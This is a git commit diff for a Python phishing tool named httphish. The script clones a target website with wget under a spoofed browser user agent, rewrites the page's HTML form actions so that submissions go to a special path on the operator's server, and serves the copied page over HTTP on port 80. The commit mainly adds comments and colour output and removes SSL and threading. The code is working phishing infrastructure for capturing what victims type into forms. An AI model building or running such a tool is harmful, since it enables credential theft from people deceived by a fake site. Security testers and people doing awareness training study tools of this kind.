2a0d1e9bd13f77efc008e1575c4a31599f25b1ff
thom-s <45467550+thom-s@users.noreply.github.com>
2019-01-01 17:50:28 -0500

    Added comments, cleaned up code a bit and removed threading+SSL for now.

--- httphish.py
+++ httphish.py
@@ -3,13 +3,16 @@ import os
 import http.server
 import socketserver
 import re
-from threading import Thread
 import ssl 
+import sys
 
 ####################
 ###   CONSTANTS  ###
 ####################
 
+GREEN = "\033[0;32m"
+RED   = "\033[1;31m" 
+RESET = "\033[0;0m"
 BANNER = '''
   _     _   _         _     _     _                   
  | |__ | |_| |_ _ __ | |__ (_)___| |__    _ __  _   _ 
@@ -24,29 +27,28 @@ INDEX_PATH = os.path.join(WEB_PATH, 'index.html')
 POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
 DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
 PORT = 80
-SSL_PORT = 443
+NO = {'no', 'n'}
 
 ############################
 ###   INPUT & WEB CRAWL  ###
 ############################
 
 os.system("clear")
+sys.stdout.write(GREEN)
 print(BANNER)
-
-yes = {'yes','y', 'ye'}
-no = {'no', 'n'}
+sys.stdout.write(RESET)
 
 use_wget = input("[*] Do you want to automatically download the page with wget? (Y/n) : ")
 
-if use_wget.lower() not in no:
+if use_wget.lower() not in NO:
     url = input("[*] What is the FULL URL you want to copy : ")
 
-    user_agent_change = input("[*] Change default user agent? (y/N) : ")
+    user_agent_change = input("[*] Use default user agent? (Y/n) : ")
     
-    if user_agent_change.lower() in yes:
-        user_agent = input("User agent : ")
-    else:
+    if user_agent_change.lower() not in NO:
         user_agent = DEFAULT_USER_AGENT
+    else:
+        user_agent = input("[*] User agent : ")
 
     print("\n[*] Downloading web page with wget ...")
 
@@ -59,44 +61,45 @@ else:
     print("[*] Make sure all the proper files are in /web before launching the HTTP server !")
 
 # Make sure index.html exists
-
 if not os.path.isfile(INDEX_PATH):
     html_files_in_web = []
+    # Look for all HTML files in the /web folder and add them to the list
     for file in os.listdir(WEB_PATH):
         if file.endswith(".html") or file.endswith(".htm"):
             html_files_in_web.append(os.path.join(WEB_PATH, file))
     
+    # If there's only 1 html file, rename it to index.hmtl, if there's more or 0, let the user choose
     if len(html_files_in_web) == 1:
         os.rename(os.path.join(WEB_PATH, html_files_in_web[0]), INDEX_PATH)
     else:
         index_filename = input("[*] Which file in /web should be used as index.html? (filename only) :")
         print("\n [*] Renaming file ...")
         os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
-        print("[*] Download completed.\n")
+        print("[*] Done.\n")
 
 
-redirect_ip = input("[*] What is the IP/domain <form> actions should forward to : ")
-
-#"[*] Which domain(s) should we forward requests we can't answer?"
+redirect_ip = input("[*] What is the IP/domain GET/POST should forward to : ")
 
 #########################
 ###  EDIT HTML FORMS  ###
 #########################
 
-print("[*] Editing HTML index file ...")
-html_as_str = open(INDEX_PATH, 'r').read()
+print("\n[*] Editing HTML index file ...")
+
 
 # Yes, I do in fact parse HTML with Regex, I know.
-
+html_as_str = open(INDEX_PATH, 'r').read()                                                      # Open the HTML as a string
 forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'                                         # Regex pattern
 html_as_str = re.sub(forms_pattern, r'\1\\custom_path_for_form_post_requests\3', html_as_str)   # Make sure that all <form> POST action is directed to a special path
 
+# Save edited HTML to file
 with open(INDEX_PATH, 'wb') as file:
     file.write(str.encode(html_as_str))
 
 
 print("[*] Done.")
 
+# Pause before launching server
 input("\n[*] Press ENTER to start the HTTP server ...")
 
 ######################
@@ -144,34 +147,24 @@ class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
     def log_message(self, format, *args):
         return
 
-def launch_server(port, http):
+def launch_server(port):
     # Change directory to /web and launch the HTTP/HTTPS server there
     os.chdir(WEB_PATH)
     httpd = socketserver.TCPServer(("", port), SimpleHTTPRequestHandler)
-    
-    # Whether to launch with HTTP or HTTPS
-    if http:
-        try:
-            print("[*] Serving HTTP at port {}.".format(port))
-            print("\n[*] Use CTRL+C to exit and close the HTTP server.")
-            httpd.serve_forever()
-        except KeyboardInterrupt:
-            httpd.server_close()
-    
-    # Removed SSL for now
-    #else: # HTTPS
-        # Wrap the socket with SSL for HTTPS
-    #    cert_path = os.path.join(CURRENT_PATH, "localhost.crt")
-    #    key_path = os.path.join(CURRENT_PATH, "localhost.key")
-    #    httpd.socket = ssl.wrap_socket(httpd.socket, server_side=True, certfile=cert_path, keyfile=key_path)
-    #    try:
-    #        print("[*] Serving HTTPS at port {}.".format(port))
-    #        print("\n[*] Use CTRL+C to exit and close the HTTP server.")
-    #        httpd.serve_forever()
-    #    except KeyboardInterrupt:
-    #        httpd.server_close()
-        
-print("\n[*] Launching HTTP/HTTPS server ...")
-Thread(target=launch_server, args=(PORT, True)).start()
-#Thread(target=launch_server, args=(SSL_PORT, False)).start()
+
+    # Start HTTP server, close it if user hits CTRL+C
+    try:
+        print("[*] Serving HTTP at port {}.".format(port))
+        print("\n[*] Use CTRL+C to exit and close the HTTP server.")
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        sys.stdout.write(RED)
+        print("[*] KeyboardInterrupt")
+        sys.stdout.write(RESET)
+        print("[*] Closing HTTP server ...")
+        httpd.server_close()
+        print("[*] Please run cleanup.py before you run this script again!")
+
+print("\n[*] Launching HTTP server ...")
+launch_server(PORT)
 
